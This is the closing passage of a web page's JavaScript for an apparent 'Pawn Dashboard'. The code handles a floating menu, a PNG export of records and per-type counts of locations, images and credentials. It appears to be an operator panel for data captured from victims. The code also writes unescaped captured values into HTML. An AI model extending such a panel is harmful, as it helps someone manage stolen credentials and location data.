            showToast('All filters cleared', 'success');
        });
    }

    // FAB Menu Logic
    const fabMain = document.getElementById('fabMain');
    const fabBoard = document.getElementById('fabBoard');
    const fabExport = document.getElementById('fabExport');
    const fabStats = document.getElementById('fabStats');
    
    let isFabOpen = false;
    
    function openFabMenu() {
        if (fabBoard) fabBoard.classList.add('active');
        if (fabExport) fabExport.classList.add('active');
        if (fabStats) fabStats.classList.add('active');
        if (fabMain) fabMain.classList.add('rotate-plus');
        isFabOpen = true;
    }
    
    function closeFabMenu() {
        if (fabBoard) fabBoard.classList.remove('active');
        if (fabExport) fabExport.classList.remove('active');
        if (fabStats) fabStats.classList.remove('active');
        if (fabMain) fabMain.classList.remove('rotate-plus');
        isFabOpen = false;
    }
    
    if (fabMain) {
        fabMain.addEventListener('click', (e) => {
            e.stopPropagation();
            if (isFabOpen) closeFabMenu();
            else openFabMenu();
        });
    }
    
    if (fabBoard) {
        fabBoard.addEventListener('click', (e) => {
            e.stopPropagation();
            closeFabMenu();
            window.location.href = "../board/";
        });
    }
    
    if (fabExport) {
        fabExport.addEventListener('click', (e) => {
            e.stopPropagation();
            closeFabMenu();
            const visibleCards = document.querySelectorAll('#cardsContainer .pawn-card:not([style*="display: none"])');
            
            // Create HTML table
            let tableHTML = `
                <div style="background: #02020A; padding: 20px; font-family: 'Inter', sans-serif; color: white; border-radius: 16px; border: 1px solid rgba(139, 92, 246, 0.35); box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.6);">
                    <h2 style="text-align: center; background: linear-gradient(105deg, #8B5CF6, #C084FC); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 20px;">Pawn Dashboard Export</h2>
                    <table style="width: 100%; border-collapse: collapse;">
                        <thead>
                            <tr style="background: rgba(139, 92, 246, 0.2);">
                                <th style="padding: 10px; border: 1px solid rgba(139, 92, 246, 0.3); text-align: left;">ID</th>
                                <th style="padding: 10px; border: 1px solid rgba(139, 92, 246, 0.3); text-align: left;">Page</th>
                                <th style="padding: 10px; border: 1px solid rgba(139, 92, 246, 0.3); text-align: left;">Email/URL/Path</th>
                                <th style="padding: 10px; border: 1px solid rgba(139, 92, 246, 0.3); text-align: left;">Type</th>
                                <th style="padding: 10px; border: 1px solid rgba(139, 92, 246, 0.3); text-align: left;">Created At</th>
                            </tr>
                        </thead>
                        <tbody>
            `;
            
            visibleCards.forEach(card => {
                const idMatch = card.querySelector('.text-gray-400.text-xs')?.innerText.match(/ID:\s*(\d+)/);
                const id = idMatch ? idMatch[1] : '';
                const page = card.querySelector('h3.text-lg')?.innerText.trim() || '';
                const typeSpan = card.querySelector('.text-xs.px-2.py-1.rounded-full');
                let type = typeSpan ? typeSpan.innerText.trim() : '';
                const createdAt = card.querySelector('.text-gray-500')?.innerText.trim() || '';
                const emailDiv = card.querySelector('.bg-black\\/30.rounded-xl.px-3.py-2');
                let emailValue = emailDiv ? emailDiv.innerText.trim() : '';
                
                tableHTML += `
                    <tr>
                        <td style="padding: 10px; border: 1px solid rgba(139, 92, 246, 0.3);">#${id}</td>
                        <td style="padding: 10px; border: 1px solid rgba(139, 92, 246, 0.3);">${page}</td>
                        <td style="padding: 10px; border: 1px solid rgba(139, 92, 246, 0.3); font-family: monospace;">${emailValue}</td>
                        <td style="padding: 10px; border: 1px solid rgba(139, 92, 246, 0.3);">${type}</td>
                        <td style="padding: 10px; border: 1px solid rgba(139, 92, 246, 0.3);">${createdAt}</td>
                    </tr>
                `;
            });
            
            tableHTML += `
                        </tbody>
                    </table>
                    <p style="text-align: center; margin-top: 20px; color: #d1d5db;">Exported ${visibleCards.length} records</p>
                </div>
            `;
            
            // Create temporary div
            const tempDiv = document.createElement('div');
            tempDiv.innerHTML = tableHTML;
            tempDiv.style.position = 'absolute';
            tempDiv.style.left = '-9999px';
            tempDiv.style.top = '-9999px';
            document.body.appendChild(tempDiv);
            
            // Use html2canvas to capture
            html2canvas(tempDiv, {
                backgroundColor: '#02020A',
                scale: 2
            }).then(canvas => {
                canvas.toBlob(blob => {
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = `pawn_export_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.png`;
                    a.click();
                    URL.revokeObjectURL(url);
                    document.body.removeChild(tempDiv);
                    showToast('Image exported successfully', 'success');
                });
            }).catch(err => {
                console.error('Export failed:', err);
                document.body.removeChild(tempDiv);
                showToast('Export failed', 'error');
            });
        });
    }
    
    if (fabStats) {
        fabStats.addEventListener('click', (e) => {
            e.stopPropagation();
            closeFabMenu();
            const total = document.querySelectorAll('#cardsContainer .pawn-card').length;
            const visible = document.querySelectorAll('#cardsContainer .pawn-card:not([style*="display: none"])').length;
            const locations = document.querySelectorAll('#cardsContainer .pawn-card[data-type="location"]').length;
            const images = document.querySelectorAll('#cardsContainer .pawn-card[data-type="image"]').length;
            const credentials = document.querySelectorAll('#cardsContainer .pawn-card[data-type="credentials"]').length;
            showToast(`Total: ${total} | Visible: ${visible} | Locations: ${locations} | Images: ${images} | Credentials: ${credentials}`, 'info');
        });
    }
    
    document.addEventListener('click', (event) => {
        const fabContainer = document.querySelector('.fab-container');
        if (isFabOpen && fabContainer && !fabContainer.contains(event.target)) {
            closeFabMenu();
        }
    });
    
    console.log("Dashboard loaded - JavaScript only filtering (no PHP reloads)");
</script>
</body>
</html>